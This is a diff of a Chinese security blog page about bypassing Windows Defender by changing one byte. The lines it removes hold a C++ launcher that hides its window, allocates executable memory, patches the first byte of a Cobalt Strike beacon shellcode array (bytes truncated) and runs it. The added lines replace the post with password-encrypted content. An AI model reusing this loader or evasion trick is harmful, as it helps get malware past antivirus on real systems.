@@ -23,20 +23,18 @@
     var NexT = window.NexT || {};
     var CONFIG = {"hostname":"tingqiao.github.io","root":"/","images":"/images","scheme":"Pisces","version":"8.0.2","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
   </script>
-<meta name="description" content="修改1字节绕过Windows Defenderhttps:&#x2F;&#x2F;www.ired.team&#x2F;offensive-security&#x2F;defense-evasion&#x2F;evading-windows-defender-using-classic-c-shellcode-launcher-with-1-byte-change 1234567891011121314151617#include &quot;s">
+<meta name="description" content="Here&#39;s something encrypted, password is required to continue reading.">
 <meta property="og:type" content="article">
 <meta property="og:title" content="免杀-修改1 Byte绕过Windows Defender">
 <meta property="og:url" content="https://tingqiao.github.io/posts/b6184c34/index.html">
 <meta property="og:site_name" content="TingQiao&#39;s blog">
-<meta property="og:description" content="修改1字节绕过Windows Defenderhttps:&#x2F;&#x2F;www.ired.team&#x2F;offensive-security&#x2F;defense-evasion&#x2F;evading-windows-defender-using-classic-c-shellcode-launcher-with-1-byte-change 1234567891011121314151617#include &quot;s">
+<meta property="og:description" content="Here&#39;s something encrypted, password is required to continue reading.">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://tingqiao.github.io/posts/b6184c34/res/2020-12-04-19-49-58.png">
 <meta property="article:published_time" content="2020-12-04T11:41:26.000Z">
-<meta property="article:modified_time" content="2020-12-05T03:50:06.069Z">
+<meta property="article:modified_time" content="2020-12-12T12:24:50.542Z">
 <meta property="article:author" content="听桥">
 <meta property="article:tag" content="内网渗透">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://tingqiao.github.io/posts/b6184c34/res/2020-12-04-19-49-58.png">
 
 
 <link rel="canonical" href="https://tingqiao.github.io/posts/b6184c34/">
@@ -174,7 +172,7 @@
 
   <aside class="sidebar">
 
-    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+    <div class="sidebar-inner sidebar-overview-active">
       <ul class="sidebar-nav">
         <li class="sidebar-nav-toc">
           文章目录
@@ -187,7 +185,6 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <section class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%AE%E6%94%B91%E5%AD%97%E8%8A%82%E7%BB%95%E8%BF%87Windows-Defender"><span class="nav-number">1.</span> <span class="nav-text">修改1字节绕过Windows Defender</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%88%E6%9E%9C"><span class="nav-number">2.</span> <span class="nav-text">效果</span></a></li></ol></div>
         </section>
         <!--/noindex-->
 
@@ -286,7 +283,7 @@
           <i class="far fa-calendar-check"></i>
         </span>
         <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2020-12-05 11:50:06" itemprop="dateModified" datetime="2020-12-05T11:50:06+08:00">2020-12-05</time>
+        <time title="修改时间：2020-12-12 20:24:50" itemprop="dateModified" datetime="2020-12-12T20:24:50+08:00">2020-12-12</time>
       </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -312,11 +309,15 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <h2 id="修改1字节绕过Windows-Defender"><a href="#修改1字节绕过Windows-Defender" class="headerlink" title="修改1字节绕过Windows Defender"></a>修改1字节绕过Windows Defender</h2><p><a target="_blank" rel="noopener" href="https://www.ired.team/offensive-security/defense-evasion/evading-windows-defender-using-classic-c-shellcode-launcher-with-1-byte-change">https://www.ired.team/offensive-security/defense-evasion/evading-windows-defender-using-classic-c-shellcode-launcher-with-1-byte-change</a></p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;Windows.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// cobalt strike beacon shellcode x64</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> shellcode[] = <span class="string">&quot;\xfd\x48\...&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> first[] = <span class="string">&quot;\xfc&quot;</span>;</span><br><span class="line">    <span class="keyword">void</span> *exec = VirtualAlloc(<span class="number">0</span>, <span class="keyword">sizeof</span> shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(shellcode, first, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(exec, shellcode, <span class="keyword">sizeof</span> shellcode);</span><br><span class="line">    ((<span class="keyword">void</span>(*)())exec)();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p><img src="/posts/b6184c34/res/2020-12-04-19-49-58.png" alt="1"></p>
-
+        <div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
+  <div class="hbe-input-container">
+  <input type="password" id="hbePass" placeholder="" />
+    <label for="hbePass">Hey, password is required here.</label>
+    <div class="bottom-line"></div>
+  </div>
+  <script id="hbeData" type="hbeData" data-hmacdigest="bc9c32104f994aa9a09196692a783f8b9da66739e764f08d8a19a2554ad0577d">543ed5037945468f2f732ef918fa4444016a783e9e53312daebe166b66787c1a0d982d93e2c33e0e855ca853c38d776089b21ac36de85f3f29d4bc5bb51a02726216812210829e742f2614c2f4713b379cebf8c100634c64892b6ab920c9d9ea74546e0844fe1dbc7d19a5cc5bc37d59346bba218960044080ebf0319ec5a737570f08a36f1581bdcb36c921ffc00eb58af832d4138e1ae89674d5cd89af7e4e8deb980a0b6e51e5e2c4188894e1701e7f4b93a6471fb6e7d42838af4e7e9739e32aed225c3b0b5a27cea66f96a7b939c1193a83ed181ec003d07074f0a4ac1c9a85e3ca46bed477135200551909b67ef625d5eca513b48d8d5befa9a95118a1db84a0c4e8d24fa2e33f69e19fd14f69df2b177d5a48f52e0ef5b9bc5b07800b3c002479670416662a9a9dc3f1b40a0d7a2438c489d34d376c9c86002002742679f1f3a5015a0b1beeed64d6bd5746c2419ac0a96cc81fa359945c71172e771dbbcacd14fdbde61516c60c2f4900c36a072874bc3f99d7d6ed81087714bd20dd3630ba79b79b0e24e59a8755fad6484dc27173d0ca8ce15d4bb9b1e80896e05a9c40002012a1d605e8ed7ac0c06ac323a553e513e816d67a6a2b5438f9fb35c217c7df1b8b109ecee7972fc950c81b453abc8f938f8ec0541d516b2b8cdd5fd444765ad750f1507f382e78f52db01083dc9994e7ce519dbb846ff155d158c5de36845c6a2913918a86e326a7a64c5c1a7bbc85ba03376d64d9ea1fd9bdcf6ef84cf9b061e977212ed633c24a5217d348e6c7d3357e0f583f0c9754a8d1935af1cc94e35eda9c8ca29502164542cbc77ef2e553fd4eed86db652ed0f45d0a377509ff6b66b85c1f4f9f4e91acfdbe741655c8497286db6afbf6dfd940c423e1facb02b31ba0828daccb44664e4345fc949cf07cec90527a6f911797b98712dd373565d2ad1adf6236fa40975ebc372e8f1eef3262f8f209840e8929d1f34a6673637c8dc829ea29f132a95eae065e1dd00b0648183b2c87908f2c12ecf2a98bdfcbb382f869977f09a086577d947db01e5233b0b455344a4e0f1d8e7d115d757a63f887ece8f61679a525527c0d8aadbea1a020a93ca3a82ae4345cee3efdc97a6c87a4c2334983b55d0e96f3aede73bb47cf1dc746aa76a68f6579ea90199d852e54fbed438de8f2907fc05f9d94c0d8e8409da715bc8696548a379b942e8b5b94899ba2504ed1ac13c2ed480e54cc2f1817f66ed835d92b8c7a7a20256d1a06ef5c0a5f7552623809f19b7708ece2968e158a744c8859626866e2166c2a76abd12b80d6f29339231e5c42e98b0bae6d46a2d78fde4f032605c58253ec47835fa4b9d116832ba07d9fd95dda30038aec62194bd7683839b7bcdcc1223064d3cf8233addfcb2494702071628f972dbfbffd247917cd466131c86ded34b90a8397eada409f0b5a5216ea57c09822425b98ae753d6e8f06bc3204d65d36409fd380058e79f33fa1ffdee6250feb078d9833571824e7b214a780be82ad1af4eb86a5215bce68dbccafa91e7bc4edb4316c009db7194ffab046b69896769c4676a504cfe70b858cb1e5bcfa1a2abb4069173e8292adfb1fd4d797c2dcece4e420eb6ada010d946058fae79d77aa7a7cfb93c560cc809d9df084777c88952475a19315a1b11b58df7cac0a8049a6709652100610f83ca74c657d9b4ec23c6a6aa4ae3a1bea5047b99e0e41fafed4ace04c83edbb82a9b635abcd54974bf17180dc61c175afd63bdb6d6507e3d1cbdab718e9aa2e0195989ca5d442dadf07c3f3b4622543331261728e63d634fc77b6129ebc83e52125d87f1be8cead79afddebc80e1903d0d2ffc756b949c613db0fa21f4dbf400a2145e4a65d0e7ce65e5f84b00cd198aca89edfec726c1f456146b9cba78b52679a15219e71060f2adf343772dcb3ac0ea47edb422a1015499ca4240f74a4567054d9ce45404a1e9ff3ce5605794dc6a7d16dc6d49a24d9dca6be7c9d01f69df2a7edc5bd4a228a5b39327834247f8e17d589ae352d677dcbb8066d3e1013f61c26d8f0bc0b6c6eb3f2bf0146c111fd175a7513447cbcf4327cbba48645d2d0519752d0569102874577cb66b9818d292db565e43521bfce27729bfdacc1766b116bcc647a27d9dab9cb9d0802d03050a714a53af923177a8dd2baafeeb5245bb9520b29092e48ee1afeca4a5cdef8f3a8a4857c60a808ecbc827bab5290426165ee102687ebd162690896912ed3d729b64e1544ba118af771d258636d2ef2df35bbdaec36e8fe78b4aefa1199d8c4310241615373fa3e8f100ca328b2e5151cbd8d6a4d0375483331454e5ee262d15b2927e3af351d98065d474ed87f7a36be8d15b4029a067f94d2047d3bbc04ea761dbf6d6009938887330e42663f7cbae8effcf37a0ea3df76dae563084218cf3c6c16229f155fdb914fc5a4190032934f313846ca5f0932e26309a89088379241fd60883cb1181b38a35326d4828d1ec21a64587fd35e5c3b14d5599dc5e8af9e9cc84fca5b52a1d9b4e1d1f6a59c6f3c4e57002210b509119c690e45839b22a7f7ec3970174daf861dcd6886e479b6cd608713097dc9ebabed529228a9f3a5aa201e8e58608e80223d3cc86ab756d3ae7123ed9a6be463fe8ce7e28a7d05be0f0698b63ce6f441ab4a7d9b317743e0784f8e734ea0d5f2de12300ba686513d710c020a1c42a6552a52b4e77b171b39be8f5e258c4b88b032d394fadebf672719559a0aac8f27b46b1ab429326504a981e9466b9f2513197e83f2c54644a36adb83425a4efa493af94dc863adbb35879c9744247f143da4949c47600c4c03fd0e9a0b0ffcf192001abda40340c1e5df0e6ed174127482cf08ff014e98a990ec91baaf9ad9ac4e722a38b7673ce04714aa359c0307427623826c245dc03cbd7f4cd012f3e29eb4b2a17f8252fa7970f7bfe2f934434c334eb38a96df1fcb5347eabd483cf5e34d45dbe3ab7b6c10dc82dab1c48378dd1a6f68091d64b2898ccc84c3e56b1a4b78148cdbed0021d629c2b1e9db50c4954033792f92dc63b2742c3da571aaef6915c2c7b44468ddeb024a66aed7985b37c113886c75f1546530286a38fbdb97b33362c040e9317fc47519da68b1a69cfe77d25d7abf34d9ae68debc43b086e481c0033c87f9d316abb86617a5a2cbdb43cea9aef6995f76661b438dc0a31045c1d375727d4b68b7cd1aa50b9673175c306dd767cb758510015ee483d7f183a3985a34a3c83d030b437a5deda6ad586740a0a357e610ebeeb4dbe6a3565918d05f47a8e3971aa07685cd5c4f671f9662e1a5b7d033164a2f7d267f16ff9b0d596f05751b86f6522c0ae1adb27525400704c95c1cb9eaac7d6a4b7aaf1f5390560742fe644f8edf77225046eebd778f114a00e09c5ae9745eebd4206c27d629f2a5eb3fdf98777128445b1a87d2a45af3dda9455a8547592de84fb1a267830c0a093e7db1e6f589ccc0a80f9bab782bf48946e61655445bd7b636f7149cab346314fd32e03ff4a643ecbfaea024a1aadb9ec38759bf938bdc42d0a2dfa2339f1cb4021b0ae0a2f6a7046d1a2bf88e941affe2e59f893fe4d559e8f381186ae1847473e616a84f8b90f1441b5eebfd46e5aad241f0efec0a30ccf2d1bdf4688bcc06255db4b35f83d7c5d7be8437c974771429d483289c42e610de4adcc66f7f8951906fe0b02d831c95aa25a9db863e363ad1ea3fc7b018f7e77048a916011c260f4a9155f547d38d89754d1acba79d263f22198a59fe80eb77c48b7c78fee07902af3828981504ca808bc6dda5e53e42751722e9063111002d26f44326f06bac8ff59c40a5db34ed4c4cbb11d02292f4a279cb72d41fcd3d64f126e1d6f18a203a0767a6dda8dad0ea8741194088449e285dbd45c16613e804cf1e302521a01765d882abed3a03437305969764893611a5959b1d712848ed2dfa4cbd06e7311868d3d8b1172942d6fa28dd0d7ad77fff03f24434331510f8cf4bc759754acbe1fc6c4eb2d237a3d5bb8d63dedb99ffa7e2c6c518dfa83135c57a5ff775a181f6f0f6b03e57dc9aed18d22ba00a2079fa56ec993b4a86d8d41640b07a648ecf8987b4810ddf166b77a1d37f63c08e6012d21c2bed4df6bbdfec304eba6b12d9da9ee77e39e1dc04bbf1faf5a75674c08028dc7919ce2861e1d21fea3af990ee4c9116f361a134878cd37918a80f59d8c9e7f53801cef69de44d29f910dca83e935d933ffbf049fdec088338073168ebe2884e2a1aa3d65c38d3c5c65d564fbc91ce3d293250fea727f5c8807fb35867ed4eb87cab6357b0747a6181b450d19dd31566b1a749ba5a90cb5dc1bc04e1f6fb0c1b72429edb7101f643e61ebb0ff6cf67a5425a4767bc3fdbaf248523feee2ca994a46036827dffa2de3ffec247db003c9647ca9b4cd6a25ce8d4691a382dc49b97b20b1d5c8c6e4a1ca9</script>
+</div>
+<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">
     </div>
 
     
